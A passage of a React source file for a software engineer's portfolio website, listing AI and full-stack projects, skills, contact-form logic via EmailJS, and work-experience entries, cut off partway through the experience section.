import React, { useState, useEffect, useRef } from 'react';
import { ChevronLeft, ChevronRight, Download, Mail, Phone, MapPin, Github, Linkedin, MessageCircleMore, ExternalLink, Menu, X } from 'lucide-react';
import "./Portfolio.css";
import emailjs from '@emailjs/browser';
import profileImage from './assets/profile.jpeg';

// import tadabbur projects images
import tadabbur1 from './assets/Tadabbur AI/1.jpeg';
import tadabbur2 from './assets/Tadabbur AI/2.jpeg';
import tadabbur3 from './assets/Tadabbur AI/3.jpeg';

// import theseus finsync images
import finsync1 from './assets/Theseus Finsync/1.png';
import finsync2 from './assets/Theseus Finsync/2.png';
import finsync3 from './assets/Theseus Finsync/3.png';

// import ai auto interviewer images
import aiAuto1 from './assets/Auto Interviewer/1.png';
import aiAuto2 from './assets/Auto Interviewer/2.png';
import aiAuto3 from './assets/Auto Interviewer/3.png';
import aiAuto4 from './assets/Auto Interviewer/4.png';
import aiAuto5 from './assets/Auto Interviewer/5.png';
import aiAuto6 from './assets/Auto Interviewer/6.png';
import aiAuto7 from './assets/Auto Interviewer/7.png';

// import benjitron images
import benjitron1 from './assets/Benjitron-9000/1.png';
import benjitron2 from './assets/Benjitron-9000/2.png';
import benjitron3 from './assets/Benjitron-9000/3.png';

// import veriqs images
import veriqs1 from './assets/Veriqs/1.png';
import veriqs2 from './assets/Veriqs/2.png';
import veriqs3 from './assets/Veriqs/3.png';
import veriqs4 from './assets/Veriqs/4.png';
import veriqs5 from './assets/Veriqs/5.png';

// import bde images
import bde1 from './assets/BDE/1.png';
import bde2 from './assets/BDE/2.png';
import bde3 from './assets/BDE/3.png';
import bde4 from './assets/BDE/4.png';
import bde5 from './assets/BDE/5.png';
import bde6 from './assets/BDE/6.png';

// import ovie images
import ovie1 from './assets/Ovie/1.png';
import ovie2 from './assets/Ovie/2.png';
import ovie3 from './assets/Ovie/3.png';
import ovie4 from './assets/Ovie/4.png';
import ovie5 from './assets/Ovie/5.png';

// import TerraIQ images
import terraiq1 from './assets/TerraIQ/1.png';
import terraiq2 from './assets/TerraIQ/2.png';
import terraiq3 from './assets/TerraIQ/3.png';
import terraiq4 from './assets/TerraIQ/4.png';
import terraiq5 from './assets/TerraIQ/5.png';

// import SolesRX images
import solesrx1 from './assets/Solesrx/1.png';
import solesrx2 from './assets/Solesrx/2.png';
import solesrx3 from './assets/Solesrx/3.png';
import solesrx4 from './assets/Solesrx/4.png';
import solesrx5 from './assets/Solesrx/5.png';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const Portfolio = () => {
  const [activeSection, setActiveSection] = useState('home');
  const [selectedProject, setSelectedProject] = useState(null);
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [scrolled, setScrolled] = useState(false);
  const [showThankYouModal, setShowThankYouModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    subject: '',
    message: ''
  });

  // Refs for scroll animations
  const aboutRef = useRef(null);
  const experienceRef = useRef(null);
  const skillsRef = useRef(null);
  const awardsRef = useRef(null);
  const projectsRef = useRef(null);
  const contactRef = useRef(null);

  // Sample project data with multiple images
  const projects = [
    {
      id: 1,
      title: "Tadabbur AI",
      description:
        "A cross-platform mobile application that curates Quranic Ayats based on user mood, offering personalized spiritual content with interactive features and user preferences.",
      images: [tadabbur1, tadabbur2, tadabbur3],
      checklist: [
        "User authentication with PostgreSQL",
        "Quranic Ayat data engineering",
        "Azure AI Search integration",
        "Intuitive React Native UI",
        "Play Store deployment"
      ],
      features: [
        "Secure login/signup",
        "Audio and text-based mood input",
        "AI-curated Quranic Ayats based on mood",
        "Reels-style scrolling of Ayats",
        "Playback controls (pause/resume)",
        "Favorites management",
        "Select from 12 reciters"
      ],
      technologies: [
        "React Native",
        "FastAPI",
        "PostgreSQL",
        "OpenAI",
        "Azure AI Search"
      ]
    },
    {
      id: 2,
      title: "AI Auto Interviewer",
      description:
        "A full-stack web platform that automates candidate interviews using AI, providing real-time evaluation, scoring, and feedback with advanced admin and user dashboards.",
      images: [aiAuto1, aiAuto2, aiAuto3, aiAuto4, aiAuto5, aiAuto6, aiAuto7],
      checklist: [
        "User authentication via Azure B2C",
        "SSO integration with Azure AD",
        "GPT-4o integration for interviews",
        "Advanced prompt engineering",
        "Interactive React-based UI",
        "Robust admin panel",
        "Multi-language support",
        "Asynchronous task handling with Celery/Redis"
      ],
      features: [
        "Google/Outlook login",
        "Audio/video interview formats",
        "Candidate face recognition",
        "AI-based scoring and feedback",
        "Multi-language interviews (e.g., Malay, English)",
        "Admin dashboard with candidate management",
        "Candidate profile update requests",
        "Excel export of candidate data",
        "Dynamic follow-up questions",
        "Interview retry mechanism",
        "Detailed dashboards for users and admins"
      ],
      technologies: [
        "React",
        "FastAPI",
        "PostgreSQL",
        "OpenAI",
        "Azure B2C",
        "Celery"
      ]
    },
    {
      id: 3,
      title: "Finsync AI",
      description:
        "An AI-powered platform that recommends optimal global banks based on user-submitted preferences, featuring SharePoint-integrated data filters, contextual retrieval, and natural language chat capabilities.",
      images: [finsync1, finsync2, finsync3],
      checklist: [
        "Excel-based data integration via SharePoint",
        "Dynamic filtering based on user input",
        "GPT-4o integration for intelligent recommendations",
        "Retrieval-Augmented Generation (RAG) pipeline for contextual insights",
        "Interactive chatbot interface with threaded memory",
        "Professional-grade UI and data visualization"
      ],
      features: [
        "Smart questionnaire for bank recommendations",
        "Detailed results with multi-criteria bank scoring",
        "Categorization of matched and mismatched banks",
        "Natural language chatbot powered by RAG and embeddings",
        "Thread-based chat history management with context recall"
      ],
      technologies: [
        "React",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "OpenAI",
        "LangChain",
        "SharePoint API",
        "RAG Pipeline",
        "Chatbot"
      ]
    },
    {
      id: 4,
      title: "Benjitron-9000",
      description:
        "Benjitron-9000 is an AI-powered automation and communication platform built for public adjusting firms. It unifies Trello, Google Workspace, Telegram, and voice systems to intelligently manage claims, automate outreach, and provide natural-language control over firm operations. Featuring GPT-4o intelligence, LangGraph workflows, and Azure-triggered automations, Benjitron ensures seamless claim tracking, document handling, and compliance with human-in-the-loop oversight.",
      images: [benjitron1, benjitron2, benjitron3],
      checklist: [
        "Telegram-based conversational interface with voice and text (via Whisper)",
        "LangChain + LangGraph orchestration for contextual claim workflows",
        "Azure Functions for event-driven data ingestion and automation triggers",
        "Trello, Gmail, Google Sheets, and Calendar integrations",
        "Dynamic appraisal and mediation readiness logic",
        "Automated voice, SMS, and email communication via Twilio and Vapi",
        "AI-generated invoices and litigation update requests",
        "Human-in-the-loop approval system for sensitive actions",
        "PGVector-powered semantic search and retrieval from structured data",
        "Secure audit logging and performance analytics dashboard"
      ],
      features: [
        "Conversational command center on Telegram for claim insights and actions",
        "AI-assisted drafting of client emails, follow-ups, and reminders",
        "Outbound AI voice calls with live transfer, voicemail fallback, and logging",
        "Event-driven automation via Azure Functions for data synchronization",
        "Embeddings-based retrieval for claim context and communication history",
        "Smart appraisal and mediation readiness detection across Trello + Gmail data",
        "Invoice generation and litigation update automation",
        "Human review and confirmation for settlement and invoice actions",
        "Team productivity tracking and task-based time estimation",
        "Secure audit logs with explainable AI interactions"
      ],
      technologies: [
        "React",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "PGVector",
        "LangChain",
        "LangGraph",
        "OpenAI (GPT-4o, Embeddings, Whisper)",
        "Twilio",
        "Vapi",
        "Azure Functions",
        "Telegram Bot API",
        "Google Workspace APIs",
        "Trello API"
      ]
    },
    {
      id: 5,
      title: "Veriqs",
      description:
        "Veriqs is an AI-powered due diligence platform designed for comprehensive background checks and risk analysis in Brazil and Mexico. It aggregates public data from court records and judicial databases, using AI-driven analysis to deliver detailed risk assessments. The platform helps users make informed decisions about personal interactions while ensuring full compliance with Brazilian data protection laws (LGPD). Features include multi-parameter search, instant risk classification, detailed PDF reports, and a complete credit/subscription payment system.",
      images: [veriqs1, veriqs2, veriqs3, veriqs4, veriqs5],
      checklist: [
        "Multi-parameter search by CPF, full name, or phone number",
        "AI-powered instant risk classification (Low/Medium/High)",
        "Comprehensive PDF report generation with criminal records and judicial data",
        "Google OAuth 2.0 authentication with JWT session management",
        "Stripe integration for credit purchases and unlimited subscriptions",
        "Credit-based wallet system for search transactions",
        "Admin dashboard for user management and payment monitoring",
        "Multi-language support (English, Spanish, Portuguese)",
        "IP-based geolocation tracking for audit purposes",
        "Full LGPD compliance with Brazilian data protection laws"
      ],
      features: [
        "Instant background verification with AI-driven risk assessment",
        "Detailed judicial involvement and court case analysis",
        "Search history tracking with geolocation data",
        "Credit wallet management for pay-per-search model",
        "Unlimited subscription option for frequent users",
        "Admin controls for user banning, refunds, and role management",
        "Transaction history with Stripe payment tracking",
        "Mobile-responsive design with intuitive navigation",
        "Localized safety tips for Brazil and Mexico regions",
        "Comprehensive audit logging and compliance reporting"
      ],
      technologies: [
        "React 19",
        "TypeScript",
        "Vite",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "SQLAlchemy",
        "SQLModel",
        "Stripe",
        "Google OAuth 2.0",
        "JWT",
        "i18next",
        "ReportLab",
        "Axios"
      ]
    },
    {
      id: 6,
      title: "BDE (Business Data Extraction)",
      description:
        "BDE is an AI-powered document intelligence platform designed for business due diligence and acquisition analysis. It processes multiple document types, connects to QuickBooks for financial data, and uses a sophisticated 5-stage scoring pipeline to evaluate companies across 8 pillars. Features include RAG-based chat, real-time WebSocket updates, multi-tenant architecture, and comprehensive acquisition recommendations with valuation guidance.",
      images: [bde1, bde2, bde3, bde4, bde5, bde6],
      checklist: [
        "Multi-format document processing (PDF, DOCX, XLSX, PPTX, audio, images)",
        "Azure OpenAI integration (GPT-4o-mini, Embeddings, Whisper)",
        "5-stage BDE scoring pipeline with 8 evaluation pillars",
        "QuickBooks OAuth integration for financial data sync",
        "RAG-powered chat with semantic search (pgvector)",
        "Real-time WebSocket progress tracking via Redis pub/sub",
        "Multi-tenant architecture with RBAC",
        "Azure Functions for async document processing",
        "Deterministic scoring algorithm with evidence traceability",
        "Automated acquisition recommendations with valuation range"
      ],
      features: [
        "Upload and process PDF, Word, Excel, PowerPoint, images, and audio files",
        "AI-powered document chunking with embedding generation",
        "RAG chat interface with source citations",
        "QuickBooks data synchronization and ingestion",
        "8-pillar company evaluation (Financial, GTM, Customer, Product, Ops, Leadership, Ecosystem, Service/Software)",
        "Red/Yellow/Green flag detection with severity ratings",
        "Overall BDE score (0-100) with valuation multiple guidance",
        "Executive acquisition recommendation with 100-day plan",
        "Real-time scoring progress via WebSocket",
        "Multi-tenant isolation with role-based access control",
        "Customizable prompt templates",
        "Complete audit trail with evidence chunk linking"
      ],
      technologies: [
        "React 19",
        "TypeScript",
        "Vite",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "pgvector",
        "SQLModel",
        "Azure OpenAI (GPT-4o-mini, Embeddings, Whisper)",
        "Azure Blob Storage",
        "Azure Queue Storage",
        "Azure Functions",
        "Redis",
        "WebSockets",
        "Azure AD (MSAL)",
        "QuickBooks API",
        "Alembic"
      ]
    },
    {
      id: 7,
      title: "Ovie AI Platform",
      description:
        "Ovie is an AI-powered business intelligence platform that combines a conversational assistant, proactive daily reports via Microsoft Teams, and multi-connector data integration (GA4, GSC, CrUX, Azure DevOps). Built on LangGraph for intelligent routing, it acts as an Optimizely specialist and co-pilot across analytics, SEO, performance, and DevOps — guiding teams through five-level troubleshooting, evidence gathering, correlation analysis, and ticket creation with full multi-tenant isolation and GDPR-compliant infrastructure.",
      images: [ovie1, ovie2, ovie3, ovie4, ovie5],
      checklist: [
        "LangGraph-based intelligent routing and multi-node orchestration",
        "Conversational AI assistant with topic management and back-references",
        "Proactive daily reports delivered via Microsoft Teams",
        "Multi-connector integration (GA4, GSC, CrUX, Azure DevOps)",
        "Dual-corpus RAG retrieval with pgvector semantic search",
        "Five-level troubleshooting pipeline with evidence correlation",
        "Three-gate validation architecture (static, single-turn, multi-turn)",
        "Multi-tenant architecture with organization-scoped RBAC",
        "DLP, audit logging, and GDPR-compliant data residency (EU-West)",
        "LangSmith observability for traces, evaluations, and experiments"
      ],
      features: [
        "Conversational assistant with natural-language intent classification",
        "Proactive Teams reports with daily and weekly highlights",
        "Optimizely expert mode with direct admin guidance",
        "Co-pilot mode for analytics, SEO, performance, and DevOps",
        "Automated incident response workflow with ticket creation",
        "Evidence-based troubleshooting with root-cause correlation",
        "Dynamic prompt assembly based on configured connectors",
        "Conversation memory with topic boundary detection",
        "Date-range clarification for ambiguous time comparisons",
        "Data validation with holiday detection and anomaly flagging",
        "Admin dashboard for connectors, users, and organization config",
        "Real-time chat with streaming responses and tool execution traces"
      ],
      technologies: [
        "Next.js 15",
        "React 19",
        "TypeScript",
        "Tailwind CSS",
        "FastAPI",
        "Python",
        "LangGraph",
        "LangChain",
        "PostgreSQL",
        "pgvector",
        "Redis",
        "Vertex AI (Gemini 2.0 Flash)",
        "Google Cloud Run",
        "Google Cloud SQL",
        "Alembic",
        "Microsoft Teams API",
        "Azure DevOps API",
        "Google Analytics 4 API",
        "Google Search Console API",
        "Chrome UX Report API",
        "LangSmith"
      ]
    },
    {
      id: 8,
      title: "TerraIQ",
      description:
        "TerraIQ is a land-prospecting platform for real estate developers in Quebec's Lanaudière region. It combines cadastral lots, municipal assessment rolls, zoning bylaws, and environmental constraints into a single explainable score per lot, so teams can quickly find buildable, under-used parcels. Zoning grids are extracted from municipal PDFs with citations to the source document and page, and a deterministic scoring engine makes the final decision, with AI used only for extraction and explanation.",
      images: [terraiq1, terraiq2, terraiq3, terraiq4, terraiq5],
      checklist: [
        "Ingestion pipeline for cadastre, assessment roll, zoning polygons, and environmental layers",
        "Parsers that extract zoning grids from per-zone bylaw PDFs, with document and page citations",
        "Deterministic scoring engine with versioned weight sets and full provenance",
        "Constructability and underutilization rules, hard exclusions, and PPCMOI score floors",
        "Per-municipality parking rules resolved from bylaws, with a default fallback",
        "Interactive map with vector tiles and score-band colouring",
        "Invite-only multi-tenant accounts with centralized role-based access control",
        "Background jobs with BullMQ for scoring and ingestion runs",
        "Fallbacks for every client-owned service (basemap, Gemini, storage) so the app runs without keys",
        "CI with typecheck, lint, unit, and e2e tests across the TypeScript and Python packages",
        "Production deployment on AWS EC2 with containerized services and S3 file storage"
      ],
      features: [
        "One 0-100 score per lot with green, yellow, and red bands",
        "Score breakdown by constructability, vacancy, density, zoning, frontage, area, neighbourhood, and environmental penalty",
        "Parcel sheet with assessment data, zoning provisions, and source citations",
        "Search and filtering across lots and municipalities",
        "Saved shortlists for tracking prospects",
        "Street View and AI-written parcel summaries",
        "Thumbs-up/down feedback on scores with a satisfaction dashboard for admins",
        "Admin panel for users, invitations, and data versions",
        "Fully French interface",
        "Live pilots in Terrebonne, Repentigny, and Joliette",
        "Cloud-hosted production environment on AWS EC2"
      ],
      technologies: [
        "Next.js 16",
        "React",
        "TypeScript",
        "Tailwind CSS 4",
        "deck.gl",
        "NestJS",
        "Kysely",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "PostGIS",
        "Martin (vector tiles)",
        "Redis",
        "BullMQ",
        "Gemini",
        "Docker",
        "Caddy",
        "AWS EC2",
        "Amazon S3",
        "Vitest",
        "Pytest"
      ]
    },
    {
      id: 9,
      title: "SolesRX Medplum (Insurance Reimbursement Workflow)",
      description:
        "SolesRX Medplum is an insurance reimbursement workflow that lets patients get insurance, Medicare or FSA/HSA approval before a custom 3D-printed insole ships. Patient intake, an ops queue for staff, and doctor paperwork run on a self-hosted Medplum server that stores all patient health information. The existing app, Strapi backend and Shopify checkout stay untouched and receive only a case ID and an approval status. Self-hosted Documenso collects e-signatures on prefilled authorization forms, and a fail-closed ship-gate holds medical orders from production until approval.",
      images: [solesrx1, solesrx2, solesrx3, solesrx4, solesrx5],
      checklist: [
        "Self-hosted Medplum 'Medical Vault' holding all PHI, with Strapi storing only a case ID and an approval status",
        "FHIR-based intake Questionnaire and a validated intake Bot that creates one Case per order",
        "Role-based Access Policies for ops staff, the intake client and Bot identities",
        "Ops queue with statuses (Received, Eligibility Check, SOCP Sent, Approved, Denied, Needs Info), notes and notifications",
        "Automatic prefilled authorization packets (PDF) for Medicare diabetic shoes/insoles and custom orthotics pathways",
        "Self-hosted Documenso e-signature server with a webhook receiver that files signed PDFs, certificates and audit logs on the Case",
        "Signed, retrying webhooks from Medplum to Strapi on every status change",
        "Ship-Gate on the Shopify side that fails closed until the case is approved or self-pay is chosen",
        "Google Cloud deployment with a dedicated VM per service, Caddy HTTPS and restricted deploy accounts",
        "CI/CD pipeline with GitHub Actions running tests on pull requests and auto-deploying on merge to main",
        "Unit and integration test suites against a real local Medplum server"
      ],
      features: [
        "Patient intake with insurance card photo, OCR, coverage choice (insurer / self-pay / FSA-HSA), uploads and consent",
        "Clear 'not a guarantee of payment' notice before submission",
        "One-click 'Set status' and 'Generate forms' screens for ops staff, with bulk actions",
        "Prefilled SOCP, Foot Evaluation, Shoe and Ortho AOB, and Supply Receipt forms generated per patient pathway",
        "'Send for signature' screen that routes fields to the doctor, fitter and patient in the right order",
        "E-signature menu to follow requests as Waiting, Signed or All",
        "Upload signed form flow that supersedes earlier copies and adds a checklist note",
        "Patient and staff emails that carry no sensitive content, including a new-case alert with only a case number",
        "PHI-free status record per Case feeding the downstream webhook",
        "Simulated intake script with dummy data to test the whole flow end to end without real patient data"
      ],
      technologies: [
        "Medplum",
        "FHIR",
        "TypeScript",
        "Medplum Bots",
        "Documenso",
        "React",
        "Node.js",
        "Strapi",
        "Shopify",
        "Webhooks",
        "Docker Compose",
        "Google Cloud (Compute Engine)",
        "Caddy",
        "GitHub Actions (CI/CD)"
      ]
    }
  ];

  const skills = [
    { name: "React", level: 90 },
    { name: "React-Native", level: 90 },
    { name: "JavaScript", level: 85 },
    { name: "Node.js", level: 80 },
    { name: "Python", level: 75 },
    { name: "FastAPI", level: 80 },
    { name: "Golang", level: 80 },
    { name: "OpenAI", level: 80 },
    { name: "PostgreSQL", level: 90 },
    { name: "Vector Database", level: 90 },
    { name: "Langraph Workflows", level: 90 },
    { name: "RAG Workflows", level: 90 },
  ];

  const [canScrollLeft, setCanScrollLeft] = useState(false);
  const [canScrollRight, setCanScrollRight] = useState(true);
  const projectsGridRef = useRef(null);

  // Add these functions for carousel navigation
  const scrollProjects = (direction) => {
    const container = projectsGridRef.current;
    if (container) {
      const scrollAmount = 370; // card width + gap
      const newScrollLeft = direction === 'left'
        ? container.scrollLeft - scrollAmount
        : container.scrollLeft + scrollAmount;

      container.scrollTo({
        left: newScrollLeft,
        behavior: 'smooth'
      });
    }
  };

  const checkScrollButtons = () => {
    const container = projectsGridRef.current;
    if (container) {
      setCanScrollLeft(container.scrollLeft > 0);
      setCanScrollRight(
        container.scrollLeft < container.scrollWidth - container.clientWidth
      );
    }
  };

  // Add useEffect to check scroll buttons
  useEffect(() => {
    const container = projectsGridRef.current;
    if (container) {
      checkScrollButtons();
      container.addEventListener('scroll', checkScrollButtons);
      window.addEventListener('resize', checkScrollButtons);

      return () => {
        container.removeEventListener('scroll', checkScrollButtons);
        window.removeEventListener('resize', checkScrollButtons);
      };
    }
  }, [projects]);

  // Initialize EmailJS
  useEffect(() => {
    // Initialize EmailJS with your public key
    if (window.emailjs) {
      window.emailjs.init("FU4zv71zDwIR2cP2z"); // Replace with your EmailJS public key
    }
  }, []);

  // Smooth scroll function
  const scrollToSection = (sectionId) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({
        behavior: 'smooth',
        block: 'start'
      });
      setActiveSection(sectionId);
      setIsMenuOpen(false);
    }
  };

  // Handle project image navigation
  const nextImage = () => {
    if (selectedProject) {
      setCurrentImageIndex((prev) =>
        prev === selectedProject.images.length - 1 ? 0 : prev + 1
      );
    }
  };

  const prevImage = () => {
    if (selectedProject) {
      setCurrentImageIndex((prev) =>
        prev === 0 ? selectedProject.images.length - 1 : prev - 1
      );
    }
  };

  const handleSubmit = async () => {
    if (!formData.name || !formData.email || !formData.subject || !formData.message) {
      alert('Please fill in all fields');
      return;
    }

    setIsSubmitting(true);

    try {
      await emailjs.send(
        "service_bo3heh9",
        "template_sn4t2xm",
        {
          name: formData.name,
          email: formData.email,
          title: formData.subject,
          message: formData.message,
        },
        "FU4zv71zDwIR2cP2z"
      );

      setFormData({ name: '', email: '', subject: '', message: '' });
      setShowThankYouModal(true);
    } catch (error) {
      console.error('Error sending email:', error);
      alert('Sorry, there was an error sending your message. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Handle form input changes
  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  // Download resume function
  const downloadResume = () => {
    // Replace with your actual resume URL
    const resumeUrl = 'https://rxresu.me/umairashfaq2015/muhammad-umair-senior-software-engineer';
    const link = document.createElement('a');
    link.href = resumeUrl;
    link.download = 'Muhammad_Umair_Senior_Software_Engineer_Resume.pdf';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Scroll effect for navbar and animations
  useEffect(() => {
    const handleScroll = () => {
      const scrollPosition = window.scrollY;

      // Update scrolled state for navbar
      setScrolled(scrollPosition > 50);

      // Handle section active states
      const sections = ['home', 'about', 'experience', 'skills', 'awards', 'projects', 'contact'];
      const scrollPos = scrollPosition + 100;

      sections.forEach((section) => {
        const element = document.getElementById(section);
        if (element) {
          const offsetTop = element.offsetTop;
          const height = element.offsetHeight;

          if (scrollPos >= offsetTop && scrollPos < offsetTop + height) {
            setActiveSection(section);
          }
        }
      });

      // Animate sections on scroll with dynamic staggered children
      const animateOnScroll = (ref, className, childSelector) => {
        if (ref.current) {
          const rect = ref.current.getBoundingClientRect();
          const isVisible = rect.top < window.innerHeight * 0.8;

          if (isVisible && !ref.current.classList.contains(className)) {
            ref.current.classList.add(className);

            // Apply staggered animation to children
            if (childSelector) {
              const children = ref.current.querySelectorAll(childSelector);
              children.forEach((child, index) => {
                setTimeout(() => {
                  child.classList.add('fade-in');
                  child.style.animationDelay = `${(index % 4) * 0.1}s`;
                }, 0);
              });
            }
          }
        }
      };

      animateOnScroll(aboutRef, 'animate-in', '.stat');
      animateOnScroll(experienceRef, 'animate-in', '.experience-item');
      animateOnScroll(skillsRef, 'animate-in', '.skill-item');
      animateOnScroll(awardsRef, 'animate-in', '.award-item');
      animateOnScroll(projectsRef, 'animate-in', '.project-card');
      animateOnScroll(contactRef, 'animate-in');
    };

    window.addEventListener('scroll', handleScroll);

    // Cleanup
    return () => {
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  return (
    <div className="portfolio">
      {/* Navigation */}
      <nav className={`navbar ${scrolled ? 'scrolled' : ''}`}>
        <div className="nav-container">
          <div className="nav-logo">
            <span>Portfolio</span>
          </div>

          <div className={`nav-menu ${isMenuOpen ? 'active' : ''}`}>
            {['home', 'about', 'experience', 'skills', 'awards', 'projects', 'contact'].map((item) => (
              <button
                key={item}
                className={`nav-link ${activeSection === item ? 'active' : ''}`}
                onClick={() => scrollToSection(item)}
              >
                {item.charAt(0).toUpperCase() + item.slice(1)}
              </button>
            ))}
          </div>

          <div className="nav-toggle" onClick={() => setIsMenuOpen(!isMenuOpen)}>
            {isMenuOpen ? <X size={24} /> : <Menu size={24} />}
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <section id="home" className="hero">
        <div className="hero-container">
          <div className="hero-content">
            <div className="hero-text">
              <h1 className="hero-title">
                Hi, I'm <span className="highlight">Muhammad Umair</span>
              </h1>
              <h2 className="hero-subtitle">Full Stack Senior Software Engineer</h2>
              <p className="hero-description">
                🚀 I build AI-powered, scalable software solutions with a strong focus on performance and user experience. With extensive experience across product and service domains, I specialize in end-to-end development using Python, Golang, React, and Microsoft Azure. Passionate about AI, clean architecture, and solving real-world problems.
              </p>
              <div className="hero-buttons">
                <button className="btn btn-primary" onClick={() => scrollToSection('projects')}>
                  View My Work
                </button>
                <button className="btn btn-outline" onClick={downloadResume}>
                  <Download size={20} />
                  Download Resume
                </button>
              </div>
              <div className="social-links">
                <a href="https://github.com/MuhammadUmair22" target="_blank" rel="noopener noreferrer">
                  <Github size={24} />
                </a>
                <a href="https://www.linkedin.com/in/muhammad-umair0/" target="_blank" rel="noopener noreferrer">
                  <Linkedin size={24} />
                </a>
                <a
                  href="https://wa.me/923214634016?text=Hi%2C%20I%20visited%20your%20portfolio%20and%20wanted%20to%20connect!"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  <MessageCircleMore size={24} />
                </a>
              </div>
            </div>
            <div className="hero-image">
              <div className="image-container">
                <img
                  src={profileImage}
                  alt="John Doe"
                />
                <div className="image-glow"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* About Section */}
      <section id="about" className="about" ref={aboutRef}>
        <div className="container">
          <h2 className="section-title">About Me</h2>
          <div className="about-content">
            <div className="about-text">
              <p>
                I'm a passionate Senior Software Engineer with 3+ years of hands-on experience in building scalable,
                AI-powered applications across both product and service-based industries.
                I specialize in end-to-end development using technologies like Python (FastAPI), Golang,
                React, and Microsoft Azure. From architecting cloud-based solutions to crafting user-friendly interfaces,
                I love solving real-world problems with clean, efficient code.
                I thrive in fast-paced environments, learn quickly, and take full ownership of the work I do—always with a focus on innovation and impact.
              </p>
              <p>
                My journey started with a Computer Science degree, and I've been constantly learning
                and adapting to new technologies. I believe in writing clean, maintainable code and
                creating user-centered applications.
              </p>
              <div className="about-stats">
                <div className="stat">
                  <span className="stat-number">7+</span>
                  <span className="stat-label">Projects Completed</span>
                </div>
                <div className="stat">
                  <span className="stat-number">3.0+</span>
                  <span className="stat-label">Years Experience</span>
                </div>
                <div className="stat">
                  <span className="stat-number">15+</span>
                  <span className="stat-label">Happy Clients</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Experience Section */}
      <section id="experience" className="experience" ref={experienceRef}>
        <div className="container">
          <h2 className="section-title">Professional Experience</h2>
          <div className="experience-timeline">
            <div className="experience-item">
              <div className="experience-header">
                <h3 className="experience-title">Software Consultant</h3>
                <span className="experience-company">10 Pearls (Service-Based Company)</span>
                <span className="experience-duration">May 2026 - Present</span>
              </div>
              <div className="experience-content">
                <h4 className="experience-category">Backend Development (Golang Microservices)</h4>
                <ul className="experience-details">
                  <li>Architected an OpenAPI-first Go microservice (Gin, Bun ORM, PostgreSQL) with 45 REST endpoints across 7 domains, using oapi-codegen to generate type-safe server stubs, request/response types, and a Go client SDK consumed by downstream services</li>
                  <li>Built a vendor-integration pipeline with webhook callbacks (GoTranscript), JSON-schema validation, transcript transformation, and a polling background worker that streams files to Google Cloud Storage and syncs records across services</li>
                  <li>Designed a versioned, JSONB-backed scoring system over 14 domain models, managed via incremental SQL migrations and tuned PostgreSQL connection pooling for service-to-service workloads</li>
                  <li>Implemented comprehensive test coverage with 88 unit tests running against a real PostgreSQL database, plus schema-validation fixtures covering valid and invalid transcript payloads</li>
                </ul>

                <h4 className="experience-category">Key Technologies</h4>
                <div className="experience-technologies">
                  <span className="tech-tag">Golang</span>
                  <span className="tech-tag">Gin</span>
                  <span className="tech-tag">Bun ORM</span>
                  <span className="tech-tag">PostgreSQL</span>
                  <span className="tech-tag">oapi-codegen</span>
                  <span className="tech-tag">OpenAPI</span>
                  <span className="tech-tag">Google Cloud Storage</span>
                  <span className="tech-tag">JSONB</span>
                  <span className="tech-tag">Microservices</span>
                </div>
              </div>
            </div>

            <div className="experience-item">
              <div className="experience-header">
                <h3 className="experience-title">Senior Software Engineer</h3>
                <span className="experience-company">Kcube.ai (Service-Based Company)</span>
                <span className="experience-duration">January 2025 - Present</span>
              </div>
              <div className="experience-content">
                <h4 className="experience-category">AI & Full Stack Development</h4>
                <ul className="experience-details">
                  <li>Built AI-powered solutions for global clients using LLM integrations, RAG pipelines, LangChain, LangGraph workflow orchestration, and multi-stage scoring pipelines with deterministic evaluation algorithms</li>
                  <li>Developed full-stack applications with React, React Native, FastAPI, and PostgreSQL with PGVector for semantic search, multi-tenant architecture, and real-time WebSocket communication</li>
                  <li>Integrated OpenAI APIs (GPT-4o, Embeddings, Whisper) for intelligent automation, interviews, content curation, document analysis, metric extraction, and acquisition recommendations</li>
                  <li>Implemented Azure services (B2C, AD, Functions, AI Search, Blob Storage, Queue Storage) for authentication, SSO, event-driven architecture, and async document processing</li>
                  <li>Built payment systems with Stripe, voice/SMS with Twilio/Vapi, QuickBooks financial data integration, and various third-party API integrations</li>
                </ul>

                <h4 className="experience-category">Key Technologies</h4>
                <div className="experience-technologies">
                  <span className="tech-tag">React</span>
                  <span className="tech-tag">React Native</span>
                  <span className="tech-tag">FastAPI</span>
                  <span className="tech-tag">Python</span>
                  <span className="tech-tag">PostgreSQL</span>
                  <span className="tech-tag">PGVector</span>
                  <span className="tech-tag">LangChain</span>
                  <span className="tech-tag">LangGraph</span>
                  <span className="tech-tag">OpenAI (GPT-4o, Embeddings, Whisper)</span>
                  <span className="tech-tag">Azure</span>
                  <span className="tech-tag">Stripe</span>
                  <span className="tech-tag">Twilio</span>
                  <span className="tech-tag">Vapi</span>
                  <span className="tech-tag">WebSockets</span>
                </div>
              </div>
            </div>

            <div className="experience-item">
              <div className="experience-header">
                <h3 className="experience-title">Software Engineer I</h3>
                <span className="experience-company">Mslm (Product-Based Company)</span>
                <span className="experience-duration">August 2023 - December 2024</span>
              </div>
              <div className="experience-content">
                <h4 className="experience-category">Backend Development (Golang)</h4>
                <ul className="experience-details">
                  <li>Architected modular Golang packages to enhance code maintainability and reusability</li>
                  <li>Optimized database operations by integrating pgx and kpgx connection pools with auto-unmarshalling, reducing runtime and memory usage</li>
                  <li>Implemented microservice architecture with a robust file server for efficient local storage and retrieval</li>
